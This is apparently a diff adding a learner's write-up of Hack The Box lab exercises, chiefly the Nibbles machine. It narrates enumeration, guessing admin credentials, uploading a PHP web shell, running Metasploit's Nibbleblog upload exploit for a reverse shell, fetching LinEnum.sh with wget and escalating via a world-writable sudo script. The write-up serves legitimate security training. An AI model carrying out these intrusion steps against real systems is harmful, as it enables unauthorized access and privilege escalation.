@@ -8,6 +8,7 @@
 - After connecting with Netcat, the output showed that SSH was the service running.
 - Applied banner grabbing to confirm the service details.
 
+---
 
 ## Section 7 — Exercises
 
@@ -26,6 +27,7 @@
 - Entered the password, navigated using `ls` and `cd`.
 - Found `flag.txt`, downloaded it using `get`, and viewed it with `cat`.
   
+---
 
 ## Section 9 - Exercise
 - Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the `/flag.txt` file.  
@@ -47,6 +49,7 @@
 - Rapid7 Vulnerability Database  
 - metasploit-framework/modules/auxiliary/scanner/http/wp_simple_backup_file_read.rb at master · rapid7/metasploit-framework
 
+---
 
 ## Section 11 — Exercise
 
@@ -70,4 +73,39 @@
 ### Helper References
 - Checklist - Linux Privilege Escalation - HackTricks
 - GTFOBins
+
+---
+
+## Sections 16 & 17 — Nibbles Machine (User Flag)
+
+- Visited the target website — showed "Hello World!" on the page. Checked page source; aside from a comment revealing the `/nibbleblog` directory, nothing else was visible — but that was already useful info.
+- Ran WhatWeb on the discovered directory. Revealed OS version, PHP session ID (confirming PHP is in use), Ubuntu Linux with server version, and the page title "Nibbles - Yum Yum". Also ran cURL — returned info in XML format.
+- Ran Gobuster and got significant output: `readme`, `/admin`, `/admin.php`, `/content`, `/plugins`, `/themes`.
+- Visited `admin.php` in the browser. Tried common credential pairs like `admin:admin` and `admin:password` — after a few attempts, Nibbleblog's blacklist protection triggered and the IP was temporarily blocked, ruling out brute-forcing.
+- Browsed to the `/content` directory. Found three subdirectories: `public`, `private`, `tmp`. Inside `private`, found `users.xml`. Requested it with cURL and prettified it using `xmllint` — revealed the email address and the page title again. Having seen "nibbles" appear multiple times, I tried it as the password and it worked. Credentials: `admin:nibbles`.
+- Navigated the admin panel and found the image upload section. Wrote a PHP web shell and uploaded it — a warning appeared but there was no server-side validation, so the upload went through. Edited the script with the required system command and re-uploaded. Started a Netcat listener, then tried to trigger it via cURL on `http://nibbleblog/content/private/plugins/my_image/image.php`. After 15 minutes of attempts with different files, the command still wasn't executing.
+- Searched for an alternative approach and found a Metasploit-based method. Opened `msfconsole`, searched for `nibbleblog`, and found the file upload exploit. Set the required options: `PASSWORD`, `LPORT`, `LHOST`, `USERNAME`, `TARGETURI`, `RHOSTS`. Ran the exploit — a reverse TCP handler started, the file upload vulnerability was triggered, and a Meterpreter session opened. Ran `whoami` — returned `nibbler`. Used `ls`, `cd`, and `cat` to navigate to `/home/nibbler/user.txt` and retrieved the flag.
+- Took 2.5 hours in total to work through each step and understand the reasoning behind it. This was a new kind of challenge — I saw how different enumeration scans surface different information and how chaining them together leads to the next step.
+
+### Helper References
+- Nibbles Walkthrough - HTB Easy | Nibbleblog RCE & Sudo Script Exploitation | D23R Cybersecurity Blog
+
+---
+
+## Section 18 — Nibbles Machine (Privilege Escalation to Root)
+
+- Inside Meterpreter, started a shell session. Following the walkthrough, the steps were: unzip the personal file, read `monitor.sh`, pull `LinEnum.sh` to the local machine, start a Python HTTP server with `sudo python3 -m http.server 8080`, then download using `wget http://<your ip>:8080/LinEnum.sh`, change permissions, and run `./LinEnum.sh`.
+- Every `wget` attempt for `LinEnum.sh` returned a 404 error — the file transfer wouldn't go through.
+- Searched for an alternative privilege escalation method. Referencing the same walkthrough blog, ran `sudo -l` in the shell session. Found: `(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh` — meaning root can execute this script without a password.
+- Ran `ls -al personal/stuff` to check permissions on `monitor.sh`. It was writable by all, meaning it could be modified and executed as root.
+- The blog's approach of overwriting the script with a payload didn't work either. With both the HTB walkthrough and the blog failing, I had to think of another way.
+- Drawing on the previous exercise, I adapted the `sudo -u user bash -c '...'` approach used to read files as an unprivileged user. Applied the same logic here and it worked — the flag in `/root/root.txt` was retrieved.
+- Overall a very rewarding experience. Being forced to think of alternative approaches gave me a real confidence boost and reinforced that there is always a roundabout way to reach the goal — it doesn't have to match what you were shown.
+
+### Helper References
+- Nibbles Walkthrough - HTB Easy | Nibbleblog RCE & Sudo Script Exploitation | D23R Cybersecurity Blog
+
+### Screenshot
+- <img width="500" alt="Mod 2 - Section 18" src="https://github.com/user-attachments/assets/3da768f2-d938-4b15-b0ad-7233da4c1510" />
+
 
